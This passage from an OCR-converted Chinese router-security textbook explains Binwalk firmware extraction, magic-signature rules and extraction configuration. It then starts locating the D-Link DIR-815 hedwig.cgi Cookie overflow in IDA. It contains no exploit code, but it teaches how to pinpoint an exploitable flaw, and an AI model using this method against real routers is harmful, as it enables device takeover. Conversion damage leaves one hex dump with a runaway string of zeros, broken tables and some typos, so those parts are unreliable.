在 8.2 节中已经讲解了手工方式提取文件系统的原理，本节将使用强大的固件分析神器 Binwalk 自动提取文件系统。Binwalk 不仅可以用于提取文件系统，而且可以用于协助研究人员对固件进行分析及逆向工程等。Binwalk 系统使用的配置文件、magic 签名文件及插件位于 Python 安装目录的 /dist-packages/binwalk/目录下。

#### 8.3.1 Binwalk智能固件扫描

Binwalk 是路由器固件分析的必备工具，该工具最大的优点就是可以自动完成指定文件的扫描，智能发掘潜藏在文件中所有可疑的文件类型及文件系统。Binwalk 是如何做到的呢？

Binwalk 的功能非常强大，本节仅对 Binwalk 如何扫描文件类型及已知的文件系统原理进行分析。如果读者感兴趣，可以通过 Binwalk 源码进一步了解 Binwalk。

# 1. Binwalk和libmagic

Binwalk 的扫描实现方法，简单地说，就是把前面介绍的重复而复杂的手工分析方法通过程序实现。但是，Binwalk 并不是简单地使用 file 命令识别文件类型，原因在于 file 命令占用

了太多的磁盘来读写 I/O，效率太低，而且 file 命令识别文件类型是从文件的第一个字节开始，且只能把磁盘上的一个文件识别成一种文件格式，所以会占用很多磁盘空间来保存文件。此外，如果使用 file 命令，就需要逐字节把路由器固件文件分割成多个文件，文件的 I/O 也必然会极大影响扫描效率。

libmagic 动态库为文件扫描提供了更好的解决方案。使用 libmagic 库函数，可以直接扫描文件的内存镜像，从而提高扫描效率。libmagic 库识别文件系统和文件类型依然依赖 magic 签名文件。

接下来将会介绍 Binwalk 中使用的 libmagic 库的导出函数，这些导出函数的定义可以在 binwalk/src/C/file-5.18/src/magic.h 中找到。

在 Binwalk 中，主要使用来自 libmagic 库的 4 个函数，分别是 magic_open、magic_close、magic_buffer、magic_load，在 magic.h 中的定义如下。

➢ 创建并返回一个 magic cookie 指针，示例如下。

magic_t magic_open(int flags);

关闭 magic 签名数据库并释放所有使用过的资源，示例如下。

void magic_close(magic_t cookie);

读取 buffer 中指定长度的数据并与 magic 签名数据库进行对比，返回对比结果描述，示例如下。

const char *magic_buffer(magic_t cookie, const void *buffer, size_t len);

从 filename 指定文件加载 magic 签名数据库，Binwalk 把多个 magic 签名文件组合到一个临时文件中用于加载，示例如下。

int magic_load(magic_t cookie, const char *filename);

Binwalk 是使用 Python 语言编写的，它通过 Python 调用 libmagic 库中的导出函数并使用面向对象的方式进行封装，封装文件路径为 binwalk/src/binwalk/core/magic.py。

Magic 类包含如下两个成员函数。

Magic.buffer(data) 函数：读取内存缓冲区数据，判断是否符合某一文件类型。

Magic.close() 函数：关闭 magic 签名数据库，释放所有使用的资源。

# 2. Binwalk算法的流程

Binwalk 算法的流程如图 8-14 所示。

 </div>

#### 8.3.2 Binwalk的提取与分析

下面介绍 Binwalk 的提取与分析过程。

01 固件扫描。对固件进行自动扫描，代码如下。

$ binwalk firmware.bin

通过扫描，Binwalk 能够智能地发现目标文件中包含的所有可识别的文件类型，如图 8-15 所示。

 </div>

02 提取文件。选项“-e”和“--extract”用于按照预定义的配置文件中的提取方法从固件中提取探测到的文件及系统，示例如下，结果如图 8-16 所示。

##### $ binwalk -e firmware.bin

##### 图8-16

选项 “-M” 和 “--matryoshka” 用于根据 magic 签名扫描结果进行递归提取，仅对 “-e” 和 “--dd” 选项有效，示例如下。

$ binwalk -Me firmware.bin

➢ 选项 “-d” 和 “--depth=<int>” 用于限制递归提取的深度，默认深度为 8，仅当 “-M” 选项存在时有效，示例如下。

$ binwalk -Me -d 5 firmware.bin

仅使用“-e”选项时，Binwalk 在对“70.7z”提取出“70”以后就停止了对其后内容的扫描和提取。如图 8-17 所示，合并使用选项“-M”与“-e”时，Binwalk 进行递归提取，扫描“70”以后，从中提取信息并存入“_70.extracted”。

 </div>

03 显示完整的扫描结果。选项 “-I” 和 “--invalid” 用于显示扫描的所有结果（即使是扫描过程中被定义为 “invalid” 的项）。当我们认为 Binwalk 错把有效文件当成无效文件时，可以

通过该选项来检查，但这样做会产生很多无用的信息，示例如下，结果如图 8-18 所示。

##### $ binwalk -I firmware.bin

 </div>

04 指令系统分析。选项 “-A” 和 “--opcodes” 用于扫描指定文件中通用 CPU 架构的可执行代码。由于某些操作码签名比较短，所以比较容易造成误判。如果我们需要确定一个可执行文件的 CPU 架构，可以使用该命令。使用 Binwalk 扫描从 firmware.bin 中提取的文件 “70” 中的可执行代码，如图 8-19 所示，在该文件中发现了很多小端机格式的 MIPS 指令。

 </div>

## 8.4 Binwalk用法进阶

通常情况下，下载并安装最新版本的 Binwalk 就可以对绝大多数路由器固件进行根文件系统的提取。但如果遇到 Binwalk 无法识别的固件，可以运用下面的方法向 Binwalk 中添加新的提取规则和提取方法，从而使 Binwalk 能够对这种新的文件系统实现扫描和提取。

#### 8.4.1 基于magic签名文件自动提取

file 命令通过 magic 签名文件中的规则识别文件的类型，而 Binwalk 也使用 magic 签名文件扫描目标文件。不同的是，Binwalk 可以扫描出目标文件中包含的多个文件的类型。

Binwalk 的开发者已经在项目中包含了大量的 magic 签名文件，当遇到新的文件类型时，用户可以自定义 magic 签名文件，使用 “--magic” 选项指定自定义 magic 签名文件路径或者将自定义的签名规则添加到 $HOME/.binwalk/magic/binwalk” 文件中，让 Binwalk 能够识别这种新的文件类型。

# 1. magic签名文件规则

magic 签名文件的每一行都指定了一条测试项。每一条测试项从一个特定的偏移（byte/string/numeric）开始比较。如果该测试项通过，将会输出一条信息。每一条测试项应该包含以下 4 个域。

##### (1) Offset（第1列）

Offset 是指被测试文件中的指定偏移位置，表示该测试项将从这里开始测试，类型为数字型或表达式。

##### (2) Type（第2列）

Type 是指被测试位置的数据类型，可能为以下值（常用）。

byte: one-byte value.

short: two-byte value, 本机字节序（本机为小端机则同 leshort，下同）。

long: four-byte value, 本机字节序。

quad: eight-byte value, 本机字节序。

string: strings of bytes.

➢ leshort: two-byte value in little-endian byte order。

➢ lelong: four-byte value in little-endian byte order.

➢ lequad: eight-byte value in little-endian byte order。

➢ beschort: two-byte value in big-endian byte order。

➢ belong: four-byte value in big-endian byte order。

➢ bequad: eight-byte value in big-endian byte order.

##### (3) Test（第3列）

Test 测试项将本列的值域文件中的值进行比较。如果类型是数值型，那么该值被指定为 C 语言格式；如果是字符型，则被指定为 C 格式字符串，并且允许转义，如 “\n” 转义表示新行。

数值型值前面的一个字符表示可能要执行的操作，举例如下。

“=20”表示来自文件中的值必须等于20。

“>20”表示来自文件中的值必须大于20。

➢“<20”表示来自文件中的值必须小于20。

“&8”表示与指定的值所有设置为1的位在文件中的值必须设置为1。这里的文件中值可以为12、24等。

“^8”表示与指定的值所有设置为1的位在文件中的值必须设置为0。这里的文件中值可以为7、23等。

“!MZ”表示如果文件中的字符串不是“MZ”则测试成功。

“~8”表示在测试之前将当前值取反（当前类型设置为 byte），成为 -9（0xF7）。

➢ “x”表示匹配任意值。

##### 注意

① 操作符 “&”、“^” 和 “~” 不适用于 float 和 double 类型。

② 数值型仍然使用 C 语言格式。例如，13 是十进制，013 是八进制，0x13 是十六进制数。

③对字符型值，来自文件的字符串必须匹配指定的字符串。可用的操作符有“=”、“<”和“>”，匹配非空行（>0）即大于空行。

##### (4) Message（第4列）

如果比较测试通过，就输出 Message。如果 Message 中包含格式化参数，那么来自文件的值将会使用 Message 中的格式化字符串进行输出。例如，“0 string MZ EXE flag:%s”如果匹配成功，输出“EXE flag:MZ”。

# 2. magic签名文件实例

下面将通过几个例子具体说明 magic signatures file 的规则。

MS Windows executables are also valid MS-DOS executables
# exe.f

0 string MZ
>0x18 leshort <0x40 MZ executable (MS-DOS)
# skip the whole block below if it is not an extended executable
>0x18 leshort >0x3f
>>(0x3c.1) string PE\0\0 PE executable (MS-Windows)
>>(0x3c.1) string LX\0\0 LX executable (OS/2)

从上面的 magic signatures file 可以看出，在 offset 列中，有的测试项在数值前面包含了一个或者多个 “>” 符号。其实，这里的 “>” 符号不再表示比较，而表示测试的等级（或深度），没有 “>” 符号表示 0 级。整个测试就像是一个树形层次结构，形成了一种 “if/then” 的逻辑能力。如果第 n 级测试成功，才会测试第  $ n+1 $ 级，否则跳过等级为  $ n+1 $ 的行直到下一个等级为 n 或者更低的行继续执行。从上面的例子看，如果第 0 级的测试 “0 string MZ” 没有通过，会跳过大于 0 级的行，寻找下一个等级为 0 的行，即该文件剩下的行都不会执行了。

间接偏移是指将从文件中获取的值作为偏移量，格式如下。

( ( x[.[bis|BISL] ] [+-] [ y ] )

“x”表示使用文件中位于x位置的值作为偏移。“[bis1]”指little-endian的byte/int/short/long。“[BISL]”指big-endian的byte/int/short/long。例如，“(0x3c.l)”表示从文件0x3c获取lelong类型的值作为此处的偏移，“(0x3c.l+0x12)”表示从文件0x3c获取lelong类型的值加0x12作为此处的偏移。

接下来我们看看使用 file 命令验证该文件的效果，如图 8-20 所示。

(X) hack@ubuntu-
hack@ubuntu-S file -m exec.if calc.exe
calc.exe PE executable (MS-Windows)
hack@ubuntu-S

 </div>

根据 magic signatures file 中的模式串，calc.exe 文件头部的部分数据如图 8-21 所示。

Offset 0 1 2 3 4 5 6 7 8 9 A B C D E F
00000000 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00 MZ 
00000010 B8 00 00 00 00 00 00 40 00 00 00 00 00 00 00 
00000020 00 00 00 00 00 00 00 00 00 00 00 00 00 
00000030 00 00 00 00 00 00 00 00 00 00 00 00 00 
00000040 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68 
00000050 69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F 
00000060 74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20 
00000070 6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00 
00000080 08 73 A6 53 4C 12 C8 00 4C 12 C8 00 4C 12 C8 00 
00000090 45 6A 5D 00 45 12 C8 00 4C 12 C9 00 D8 13 C8 00 
000000A0 45 6A 5B 00 6D 12 C8 00 45 6A 4B 00 57 12 C8 00 
000000B0 45 6A 4C 00 CE 12 C8 00 45 6A 5C 00 4D 12 C8 00 
000000C0 45 6A 59 00 4D 12 C8 00 52 69 63 68 4C 12 C8 00 
000000D0 00 00 00 00 00 00 00 50 45 00 00 4C 01 04 00 
000000E0 9D 97 E7 4C 00 00 00 00 00 00 00 00 00 E0 00 02 01 
. ?錦 ？..

##### 图8-21

对照 magic 签名文件（示例 1）与 calc.exe，对 file 命令执行结论分析如下。

第 0 级 “MZ” 成立，继续执行第 1 级。

0x18 位置值为 0x00000040，第 2 个等级为 1 的行成立，继续执行第 2 级。

在 0x3c 位置取 0x000000D8，将其作为偏移，匹配 0x000000D8 处是否存在字符串 “PE\0\0”，如果成立，则输出 “PE executable (MS-Windows)”。因此，下一个同等级的 “LE\0\0” 是不成立的，比较完成。

相对偏移是指指定的偏移是相对于上一个测试等级的偏移，格式如下。

&value

示例 2 exe.f1

exe.fl
string MZ
>0x18 leshort >0x3f
>>(0x3c.1) string PE\0\0 PE executable (MS-Windows)
# immediately following the PE signature is the CPU type
>>>&0 leshort 0x14c for Intel 80386
>>>&0 leshort 0x184 for DEC Alpha

0x3c 处的值 0x000000D8 匹配 “PE\0\0” 后偏移量位于 0x000000DC，下一个等级测试依赖上一个等级偏移 0x000000DC，相对位移为 0，因此，这里测试的偏移就是 0x000000DC 值为 0x014C，输出 “for Intel 80386”，如图 8-22 所示。

file 命令测试 calc.exe 的结果如图 8-23 所示。

间接偏移与相对偏移结合，示例如下。

示例 3 exe.f2

1 # exe.f2

2 0 string MZ
3 >0x18 leshort >0x3f
4 >> (0x3c.1) string PE\0\0 PE executable (Windows)
5 # at offset 0x80 (-4, since relative offsets start at the end
6 # of the up-level match) inside the LE header, we find the absolute
7 # offset to the code area, where we look for a specific signature
8 >>(&0x7.1+0x1) string x \b, string: %s

Offset 0 1 2 3 4 5 6 7 8 9 A B C D E F
00000000 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00 EZ..... 
00000010 B8 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0

 </div>

 </div>

此处相对偏移的计算思路为：将文件中 0x3c 获取的偏移 +strlen(PE\0\0") 作为当前偏移（0x000000DC），再从相对当前偏移 0x7 的位置（0x0x000000E3）取出 lelong 类型的值（0x0000004C），在此基础上与 0x1 相加得到最终的 offset（0x0000004D），如图 8-24 所示。

 </div>

验证执行结果，如图 8-25 所示。

 </div>

至此，整个 magic signatures file 的主要内容就阐述得差不多了。如果读者需要获取更多解释，可以使用 man 命令查看，命令为 “man magic”。

使用 Binwalk 加载自定义的 magic 签名文件 exe.fl，扫描 calc.exe，结果如图 8-26 所示。

 </div>

#### 8.4.2 基于Binwalk的配置文件提取

Binwalk 的配置文件是为了定义 Binwalk 扫描到的已知文件类型的提取方法，如果在进行安全研究的过程中发现了一些新的文件类型，可以向该配置文件中增加这种新的文件类型提取方式，让 Binwalk 自动完成新的类型文件的提取，基本格式如下。

 $$ < 大小写不敏感  唯一字符串 >:< 期望的文件扩展名 >:< 执行的命令 > $$ 

##### 注意

①文件每行共3个域，各域之间用冒号分隔。

②可以通过 Binwalk 参数 “--dd” 指定自定义的提取规则。

③第1个域中的字符串不区分大小写，该字符串唯一，且与Binwalk中输出的文本相同。

④第2个域中文件的扩展名是提取出来的原始数据保存的后缀名。

⑤ 在第 3 个域中要注意占位符的使用。例如，“%e”占位符将被替换为所提取的文件的相对路径，如图 8-27 所示。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td colspan="2">Default extract rules loaded when --extract is specified.</td></tr><tr><td colspan="2">&lt;case-insensitive unique string from binwalk output text&gt;&lt;desired file extenslon&gt;&lt;command to execute&gt;</td></tr><tr><td colspan="2">Note that % is a place holder for the extracted file name.</td></tr><tr><td colspan="2">Assumes these utilities are installed in SPATH.</td></tr><tr><td colspan="2">gzip compressed data:gz:gzip -d -f &quot;%e&quot;</td></tr><tr><td colspan="2">Lzma compressed data:7z87z -e -y &quot;%e&quot;</td></tr><tr><td colspan="2">xz compressed data:tar:tar -xif &quot;%e&quot;</td></tr><tr><td colspan="2">bzip2 compressed data:bz2:bzip2 -d -f &quot;%e&quot;</td></tr><tr><td colspan="2">compressid data:z:compress -d &quot;%e&quot;</td></tr><tr><td colspan="2">zip archive data:zipjar xf &quot;%e&quot; # jar does a better job of unzipping than unzip does...</td></tr><tr><td colspan="2">Postx tar archive tar:tar xvf &quot;%e&quot;</td></tr><tr><td colspan="2">tar archive data:rarunrar e &quot;%e&quot;</td></tr><tr><td colspan="2">tar archive data:rarunrar -x &quot;%e&quot; # this is for the &quot;free&quot; version</td></tr><tr><td colspan="2">tar archive data:comment header:arjarj e &quot;%e&quot;</td></tr><tr><td colspan="2">lha:lha:lha et %e&#x27;</td></tr></table>

 </div>

### 第 9 章 漏洞分析简介

本章介绍的是路由器漏洞分析的基本方法论。在接下来的章节中，会选取一部分有代表性的路由器实际漏洞作为案例进行详细的分析，并根据漏洞开发 exploit 进行利用测试。读者可将前面的内容融会贯通，并可在真实的设备上进行测试，完整地体验路由器设备攻防的乐趣。

在具体的漏洞案例分析中，力求在只知道漏洞描述的情况下进行漏洞的剖析。读者可以举一反三，在获取漏洞描述之后，通过分析准确定位漏洞的关键位置，并进一步开发利用脚本。

## 9.1 漏洞分析概述

漏洞分析是指在代码中迅速定位漏洞，弄清攻击原理，准确地估计潜在的漏洞利用方式和风险等级的过程。

扎实的漏洞利用技术是进行漏洞分析的基础，更是进行漏洞挖掘的基础，否则，很可能将不可以利用的 bug 判断成漏洞，或者将可以允许远程控制的高危漏洞误判成 DoS 型的中级漏洞。

## 9.2 漏洞分析方法

可以通过一些漏洞公布网站获取漏洞信息。这样的网站很多，如 exploit-db（http://www.exploit-db.com）等。这些网站在公布漏洞时通常会提供漏洞厂商、影响版本、漏洞描述、漏洞发现时间、漏洞公布时间、漏洞状态、漏洞 POC（漏洞发现者提供的一段可以重现漏洞的代码，这段代码叫做 “Proof of Concept”，缩写为 “POC”）等信息。虽然这些信息并可能不全面，有些漏洞提供者可能只提供了其中的一部分，甚至不公布漏洞的 POC，但大都会有简单的漏洞描述，有时候这些线索可能很有帮助。

网上公布的 POC 有很多形式，只要能触发漏洞、重现攻击过程即可。例如，它可能是一个能够引起程序崩溃的畸形文件，还可能是漏洞发现者编写的可实现一定功能的 Python 脚本。根据得到的 POC 不同，漏洞分析的难度也会有所不同。在得到 POC 之后，就需要部署漏

洞分析实验环境，利用 POC 重现攻击过程，定位漏洞函数，分析漏洞产生的具体原因；根据 POC 和漏洞的情况实现漏洞的利用。

下面介绍在路由器漏洞分析中常用的两种分析方法。

动态调试：使用 IDA 的动态调试功能，跟踪指令执行流程，追踪输入数据在程序中的处理过程。

静态分析：使用 IDA 获得程序的“全局观”，具有非常清晰的代码结构，能够高质量地支持 MIPS 指令的反汇编代码，辅助进行动态调试。

POC 对漏洞的分析具有很高的价值，除了安全专家需要分析这些漏洞外，攻击者也在夜以继日地分析漏洞。当一款路由器的漏洞被公布以后，厂商通常不会在短时间内给出固件的更新版本，而且很少有人会去更新路由器的固件，因此，路由器漏洞的危害更大。

# 第 10 章 D-Link DIR-815 路由器 多次溢出漏洞分析

本章实验测试环境说明如表 10-1 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>测试环境</td><td style='text-align: center; word-wrap: break-word;'>备注</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>操作系统</td><td style='text-align: center; word-wrap: break-word;'>Ubuntu 12.04</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>文件系统提取工具</td><td style='text-align: center; word-wrap: break-word;'>Binwalk 2.0</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>调试器</td><td style='text-align: center; word-wrap: break-word;'>IDA 6.1</td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

## 10.1 漏洞介绍

D-Link DIR-815 路由器能够提供双频段无线信号，提供高覆盖、高效率与低干扰的多媒体家庭无线宽带网络。

但就是这样一款多功能智能路由器，如果存在可以被利用的漏洞，对于用户来说无疑是晴天霹雳。exploit-db 上 POC 的描述如图 10-1 所示。可以看出，该漏洞影响 DIR-300 和 DIR-645 路由器。而从 D-Link 官方安全公告（http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10008）来看，仅提及这个漏洞会影响 D-Link DIR-645 路由器，如图 10-2 所示。

在实际测试中，该漏洞还影响 DIR-815 路由器（也许该漏洞还存在于其他型号的路由器中）。可以看出，同一个厂家生产的路由器，同一个漏洞，造成的危害不容小觑。

从 POC 和漏洞的公告中我们可以看出，该漏洞存在于名为 “hedwig.cgi” 的 CGI 脚本中，未认证攻击者通过调用这个 CGI 脚本传递一个超长的 Cookie 值，使程序堆栈溢出，从而获得路由器远程控制权限。

经测试，此漏洞可能影响的路由器有 D-Link DIR-815、DIR-300、DIR-600 及 DIR-645。这里仅就 DIR-815 路由器进行分析，其他版本和型号的分析过程类似。分析环境如表 10-2 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>描述</td><td style='text-align: center; word-wrap: break-word;'>备注</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>路由器型号</td><td style='text-align: center; word-wrap: break-word;'>DIR-815</td><td style='text-align: center; word-wrap: break-word;'>D-Link</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>硬件版本</td><td style='text-align: center; word-wrap: break-word;'>A1</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>固件版本</td><td style='text-align: center; word-wrap: break-word;'>1.01</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>指令系统</td><td style='text-align: center; word-wrap: break-word;'>MIPSEL</td><td style='text-align: center; word-wrap: break-word;'>小端机格式</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>QEMU</td><td style='text-align: center; word-wrap: break-word;'>1.7.90</td><td style='text-align: center; word-wrap: break-word;'>处理器模拟软件</td></tr></table>

 </div>

 </div>

## 10.2 漏洞分析

下面将详细分析这个漏洞产生的原因和利用方法。

#### 10.2.1 固件分析

从 D-Link 官方技术支持网站下载固件，下载链接为 ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.ZIP，解压缩得到固件 “DIR-815 FW 1.01b14_1.01b14.bin”。

使用 Binwalk 将固件中的文件系统提取出来，如图 10-3 所示。

 </div>

该漏洞的核心组件为 /htdocs/web/hedwig.cgi，如图 10-4 所示。

 </div>

可以看到，漏洞组件 hedwig.cgi 是一个指向 ./htdocs/cgibin 的符号链接，也就是说，真正的漏洞代码在 cgibin 中。

#### 10.2.2 漏洞成因分析

从漏洞公告中我们已经知道，漏洞产生的原因是 Cookie 的值超长。接下来，我们就具体定位和分析漏洞产生的原因。

通过 char *getenv("HTTP_COOKIE") 函数可以在 CGI 脚本中获取用户输入的 Cookie 值，在这里只需要在 IDA 的 hedwig.cgi 中搜索 “HTTP_COOKIE” 即可。这里的 hedwig.cgi 是指向

程序 /htdocs/cgibin 的一个符号链接，因此，使用 IDA 加载 /htdocs/cgibin 后，在 IDA 菜单栏中依次选择 “View” → “Open subviews” → “Strings” 选项（或者使用快捷键 “Shift+F12”），如图 10-5 所示。

 </div>

此时，在 “Strings” 窗口单击选中任意行，然后直接通过键盘输入 “HTTP_COOKIE”，就可以快速定位字符串了，如图 10-6 所示。

双击字符串，定位到 rodata 段对 “HTTP_COOKIE” 的具体定义处，如图 10-7 所示。单击选中 “aHttp_cookie”，使用快捷键 “X” 查看数据交叉引用信息，可以看到，只有一个函数使用了字符串 “HTTP_COOKIE”，如图 10-8 所示。

对使用 HTTP_COOKIE 的函数 sess_get_uid 继续使用快捷键 “X” 查询其函数的交叉调用关系，发现 sess_get_uid 函数在 hedwig.cgi 模块中的两个引用项，如图 10-9 所示，因此，漏洞发生的位置就应该在此函数附近。

在确定了漏洞发生的大概位置之后，我们再来看看 hedwig.cgi 中是谁调用了 sess_get_uid 函数。单击选中函数名 “sess_get_uid”，按快捷键 “X”，会弹出交叉引用表，选中 “hedwig_main+1C8” 处的 “jalr $t9;sess_get_uid”，双击即可跳转到调用 sess_get_uid 函数的位置，如图 10-10 所示。在函数下方有一个危险函数 sprintf，该函数位于 hedwig_main 函数中。从 0x00409648 到 0x00409684 的反汇编代码来看，初步分析这个函数很可能是造成缓冲区溢出的位置。同时，通过对 sess_get_uid 函数的分析发现，Cookie 的组织形式应该为 “uid=payload”

才会被程序接受。为了验证是否是 0x00409680 位置的 sprintf 函数造成了该溢出漏洞。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>X</td><td style='text-align: center; word-wrap: break-word;'>X</td><td style='text-align: center; word-wrap: break-word;'>X</td></tr></table>

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>X</td><td style='text-align: center; word-wrap: break-word;'>IDAViewA</td><td style='text-align: center; word-wrap: break-word;'>X</td><td style='text-align: center; word-wrap: break-word;'>Hex ViewA</td><td style='text-align: center; word-wrap: break-word;'>X</td><td style='text-align: center; word-wrap: break-word;'>Structures</td><td style='text-align: center; word-wrap: break-word;'>X</td><td style='text-align: center; word-wrap: break-word;'>En</td><td style='text-align: center; word-wrap: break-word;'>Enum</td><td style='text-align: center; word-wrap: break-word;'>X</td><td style='text-align: center; word-wrap: break-word;'>Imports</td><td style='text-align: center; word-wrap: break-word;'>X</td><td style='text-align: center; word-wrap: break-word;'>-</td><td style='text-align: center; word-wrap: break-word;'>Strings window</td><td style='text-align: center; word-wrap: break-word;'>X</td><td style='text-align: center; word-wrap: break-word;'>Exports</td><td style='text-align: center; word-wrap: break-word;'>-</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; 